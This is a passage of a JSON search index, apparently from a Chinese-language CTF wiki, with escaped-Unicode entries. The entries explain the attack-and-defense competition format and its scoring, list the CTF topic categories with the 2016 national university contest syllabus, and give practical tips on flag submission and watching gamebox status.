\u8d5b\u5236\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed\n48 \u5c0f\u65f6\u53ca\u4ee5\u4e0a\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002  \u63a5\u4e0b\u6765\u8bb2\u8bb2\u653b\u9632\u6a21\u5f0f\u7684\u5177\u4f53\u60c5\u51b5\uff1a  \u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u7ea6\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u534a\u5c0f\u65f6\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002  \u9996\u5148\u9700\u8981\u63a5\u5165\u6bd4\u8d5b\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u4e0e\u7f51\u7ebf\u63a5\u53e3\u8f6c\u6362\u5668\uff08\u6bd4\u5982 Mac \u7535\u8111\u9700\u8981\u4f7f\u7528\uff0c\u5982\u679c\u4e3b\u529e\u65b9\u6ca1\u6709\u63d0\u4f9b\u7684\u8bdd\uff0c\u90a3\u5c31\u9700\u8981\u4f60\u81ea\u5907\u4e86\u3002\u5b58\u5728\u6b64\u95ee\u9898\u7684\u5c0f\u4f19\u4f34\u53ef\u4ee5\u6ce8\u610f\u4e00\u4e0b\uff09\u3002\u6587\u6863\u4e0a\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8fde\u63a5\u9700\u8981\u586b\u5199\u7684  IP\n\u5730\u5740\u3001\u7f51\u5173\u3001\u63a9\u7801\u3001DNS \u670d\u52a1\u5668\u5730\u5740  \u7528\u4e8e\u8fde\u63a5\u7f51\u7edc\u3002  \u6587\u6863\u4e0a\u4f1a\u660e\u786e\u7ed9\u51fa  \u53c2\u8d5b\u961f\u4f0d\u6240\u5728 IP \u7f51\u6bb5  \u3001  \u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0  \u3001  \u5df1\u65b9 Gamebox \u7684 IP \u5730\u5740  \u3001  \u767b\u5f55\u7528\u6237\u540d\u5bc6\u7801  \u4ee5\u53ca  \u654c\u65b9 Gamebox \u6240\u5728 IP \u7f51\u6bb5  \u3002  \u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684  \u7f51\u7edc\u62d3\u6251\u56fe  \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684  Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09  \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002\u53c2\u8d5b\u961f\u4f0d\u4f7f\u7528\u6587\u6863\u63d0\u4f9b\u7684\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55\u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0\u548c Gamebox\u3002   \u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002  \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u822c\u6bcf\u8f6e\u5927\u7ea6\u662f 3 - 5\n\u5206\u949f\u65f6\u95f4\u3002\u4f60\u9700\u8981\u5199\u811a\u672c\u81ea\u52a8\u63d0\u4ea4\u5230\u7b54\u9898\u5e73\u53f0\uff08\u624b\u52a8\u63d0\u4ea4\u4e5f\u884c\uff09\u4e0a\u5f97\u5206\u3002\u6bcf\u652f\u961f\u4f0d\u90fd\u4f1a\u6709\u4e00\u5b9a\u7684\u521d\u59cb\u5f97\u5206\uff08\u4e00\u822c\u521d\u59cb\u5f97\u5206\u76f8\u540c\uff0c\u5982\u679c\u8d5b\u524d\u4f1a\u76f8\u5e94\u8003\u6838\uff0c\u90a3\u4e48\u4f1a\u6839\u636e\u8d5b\u524d\u8003\u6838\u6210\u7ee9\u8bbe\u7f6e\u653b\u9632\u8d5b\u7684\u521d\u59cb\u5f97\u5206\uff09Gamebox \u72b6\u6001\u5206\u4e3a\u4e09\u79cd\uff0c \u6b63\u5e38\u3001\u653b\u9677\u3001\u4e0d\u53ef\u7528  \u3002Gamebox \u4e2d\u7684 flag \u4e5f\u4f1a\u6bcf\u8f6e\u8fdb\u884c\u5237\u65b0\u3002  \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u6709\u88c1\u5224\u7cfb\u7edf\u6bcf\u8f6e\u90fd\u4f1a\u8fdb\u884c\u8bc4\u5b9a\u3002   \u5982\u679c\u4e00\u8f6e\u8fc7\u53bb\uff0cGamebox \u8868\u73b0\u6b63\u5e38\uff0c\u90a3\u4e48\u88c1\u5224\u7cfb\u7edf\u4f1a\u6839\u636e\u672c\u8f6e\u672a\u88ab\u653b\u9677\u7684 Gamebox \u60c5\u51b5\u7ed9\u4e88\u9632\u5fa1\u5f97\u5206  \u5982\u679c\u9632\u5fa1\u8fc7\u4e8e\u4e25\u683c\uff0c\u65e0\u6cd5\u901a\u8fc7\u88c1\u5224\u7cfb\u7edf\u7684  \u6f0f\u6d1e\u670d\u52a1\u53ef\u7528\u6027\u5224\u5b9a  \u7684\u8bdd\uff0c\u8be5\u8f6e\u4f1a\u88ab\u88c1\u5224\u7cfb\u7edf\u8ba4\u5b9a\u4e3a\u8be5 Gamebox \u4e0d\u53ef\u7528\uff08\u89c6\u4e3a\u5b95\u673a\uff09\u3002\u672c\u8f6e\u76f4\u63a5\u5931\u5206\u3002  \u5982\u679c Gamebox \u88ab\u653b\u9677\uff08\u6709\u961f\u4f0d\u63d0\u4ea4\u4e86\u4f60\u4eec\u961f Gamebox \u4e0a\u968f\u673a\u751f\u6210\u7684 flag\uff09\uff0c\u90a3\u4e48\u88c1\u5224\u7cfb\u7edf\u4f1a\u7ed9\u4e88\u8be5\u961f\u653b\u51fb\u5f97\u5206\u3002  \u4e00\u8f6e\u4e0b\u6765\uff0c\u7531\u6210\u529f\u653b\u9677\u8be5 Gamebox \u7684\u961f\u4f0d\u5e73\u5206\u653b\u9677\u5f97\u5206\u3002   \u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f  \u4e0b\u5348\u4f1a\u6362\u65b0\u9898  \u3002", 
            "title": "\u653b\u9632\u6a21\u5f0f - Attack &amp; Defense"
        }, 
        {
            "location": "/introduction/content/", 
            "text": "\u56e0\u4e3a CTF \u7684\u8003\u9898\u8303\u56f4\u5176\u5b9e\u6bd4\u8f83\u5bbd\u5e7f\uff0c\u76ee\u524d\u4e5f\u6ca1\u6709\u592a\u660e\u786e\u7684\u89c4\u5b9a\u754c\u9650\u8bf4\u4f1a\u8003\u54ea\u4e9b\u5185\u5bb9\u3002\u4f46\u662f\u5c31\u76ee\u524d\u7684\u6bd4\u8d5b\u9898\u578b\u800c\u8a00\u7684\u8bdd\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u636e\u5e38\u89c1\u7684 \nWeb \u7f51\u7edc\u653b\u9632\u3001RE \u9006\u5411\u5de5\u7a0b\u3001Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\u3001Crypto \u5bc6\u7801\u653b\u51fb\u3001Mobile\n\u79fb\u52a8\u5b89\u5168\n \u4ee5\u53ca \nMisc \u5b89\u5168\u6742\u9879\n \u6765\u8fdb\u884c\u5206\u7c7b\u3002\n\n\n\n\n\n\nWeb - \u7f51\u7edc\u653b\u9632\n\n\n\u4e3b\u8981\u4ecb\u7ecd\u4e86 Web \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u6f0f\u6d1e\uff0c\u5982 SQL \u6ce8\u5165\u3001XSS\u3001CSRF\u3001\u6587\u4ef6\u5305\u542b\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u4ee3\u7801\u5ba1\u8ba1\u3001PHP \u5f31\u7c7b\u578b\u7b49\uff0cWeb \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u9898\u578b\u53ca\u89e3\u9898\u601d\u8def\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u5de5\u5177\u3002\n\n\n\n\n\n\nReverse Engineering - \u9006\u5411\u5de5\u7a0b\n\n\n\u4e3b\u8981\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u7684\u5e38\u89c1\u9898\u578b\u3001\u5de5\u5177\u5e73\u53f0\u3001\u89e3\u9898\u601d\u8def\uff0c\u8fdb\u9636\u90e8\u5206\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u5e38\u89c1\u7684\u8f6f\u4ef6\u4fdd\u62a4\u3001\u53cd\u7f16\u8bd1\u3001\u53cd\u8c03\u8bd5\u3001\u52a0\u58f3\u8131\u58f3\u6280\u672f\u3002\n\n\n\n\n\n\nPwn - \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\n\n\nPwn \u9898\u76ee\u4e3b\u8981\u8003\u5bdf\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u7684\u53d1\u6398\u548c\u5229\u7528\uff0c\u9700\u8981\u5bf9\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u5e95\u5c42\u6709\u4e00\u5b9a\u7684\u4e86\u89e3\u3002\u5728 CTF \u7ade\u8d5b\u4e2d\uff0cPWN \u9898\u76ee\u4e3b\u8981\u51fa\u73b0\u5728 Linux \u5e73\u53f0\u4e0a\u3002\n\n\n\n\n\n\nCrypto - \u5bc6\u7801\u653b\u51fb\n\n\n\u4e3b\u8981\u5305\u62ec\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e24\u90e8\u5206\u5185\u5bb9\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\u8da3\u5473\u6027\u5f3a\uff0c\u79cd\u7c7b\u7e41\u591a\uff0c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5b89\u5168\u6027\u9ad8\uff0c\u5bf9\u7b97\u6cd5\u7406\u89e3\u7684\u8981\u6c42\u8f83\u9ad8\u3002\n\n\n\n\n\n\nMobile - \u79fb\u52a8\u5b89\u5168\n\n\n\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5b89\u5353\u9006\u5411\u4e2d\u7684\u5e38\u7528\u5de5\u5177\u548c\u4e3b\u8981\u9898\u578b\uff0c\u5b89\u5353\u9006\u5411\u5e38\u5e38\u9700\u8981\u4e00\u5b9a\u7684\u5b89\u5353\u5f00\u53d1\u77e5\u8bc6\uff0ciOS \u9006\u5411\u9898\u76ee\u5728 CTF \u7ade\u8d5b\u4e2d\u8f83\u5c11\u51fa\u73b0\uff0c\u56e0\u6b64\u4e0d\u4f5c\u8fc7\u591a\u4ecb\u7ecd\u3002\n\n\n\n\n\n\nMisc - \u5b89\u5168\u6742\u9879\n\n\n\u4ee5\u8bf8\u845b\u5efa\u4f1f\u7ffb\u8bd1\u7684\u300a\u7ebf\u4e0a\u5e7d\u7075\uff1a\u4e16\u754c\u5934\u53f7\u9ed1\u5ba2\u7c73\u7279\u5c3c\u514b\u81ea\u4f20\u300b\u548c\u4e00\u4e9b\u5178\u578b MISC \u9898\u4e3a\u5207\u5165\u70b9\uff0c\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u3001\u7f16\u7801\u5206\u6790\u3001\u53d6\u8bc1\u5206\u6790\u3001\u9690\u5199\u5206\u6790\u7b49\u3002\n\n\n\n\n\n\n\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9\n\n\n2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u8bbe\u7acb\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002\n\n\n\n\n\u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548c\n    XSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002\n\n\n\u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK\n    \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002\n\n\n\u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86\uff3f64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002\n\n\n\u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002\n\n\n\u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002", 
            "title": "CTF \u7ade\u8d5b\u5185\u5bb9"
        }, 
        {
            "location": "/introduction/content/#-", 
            "text": "2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u8bbe\u7acb\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002   \u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548c\n    XSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002  \u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK\n    \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002  \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86\uff3f64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002  \u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002  \u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002", 
            "title": "\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9"
        }, 
        {
            "location": "/introduction/experience/", 
            "text": "\u9996\u5148\u6b63\u5e38\u6bd4\u8d5b\u4f1a\u63d0\u4f9b\u63d0\u4ea4 flag \u7684\u63a5\u53e3\uff0c\u63a5\u53e3\u5730\u5740\u7c7b\u4f3c \nhttp://172.16.4.1/Common/submitAnswer\n\u3002\u4e00\u822c\u6211\u4eec\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u6587\u6863\u8981\u6c42\u901a\u8fc7\u63a5\u53e3\u63d0\u4ea4 flag\u3002\u5728\u6bd4\u8d5b\u4e2d\u8981\u6c42\u63a5\u53e3\u5730\u5740\u4f7f\u7528 Post\n\u65b9\u5f0f\u63d0\u4ea4\uff0c\u63d0\u4ea4\u65f6\u5e26\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f \nAnswer\n\uff0c\u5176\u503c\u4e3a\u83b7\u53d6\u5230\u7684 flag \u5b57\u7b26\u4e32\uff0c\u800c\u53e6\u4e00\u4e2a\u5219\u662f \ntoken\n \uff0c\u5176\u503c\u4e3a\u5404\u4e2a\u961f\u4f0d\u7684\u961f\u4f0d Token\u3002\n\n\n\u7136\u540e\u6bd4\u8d5b\u65f6\u4e3b\u529e\u65b9\u4e5f\u4f1a\u7ed9\u6bcf\u4e2a\u53c2\u8d5b\u961f\u4f0d\u63d0\u4f9b\u4e00\u53f0\u7528\u4e8e \n\u5206\u6790\u7f51\u7edc\u6d41\u91cf\u7684\u865a\u62df\u673a\n \uff0c\u9009\u624b\u9700\u8981\u8bbf\u95ee\u5730\u5740\u4e0b\u8f7d\u6d41\u91cf\u6587\u4ef6\u8fdb\u884c\u5206\u6790\u3002\n\n\n\u5173\u6ce8 Gamebox \u72b6\u6001\n\n\n\u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002\n\n\n\u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a\n\n\n\n\n\u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002\n\n\n\u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch \u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down\n    \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u7684\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002\n\n\n\u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002\n\n\n\u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002\n\n\n\n\n\u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002\n\n\n\n\n\u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb\n\n\n\u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002\n\n\n\n\n\u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3\n\n\n\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002\n\n\n\u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox 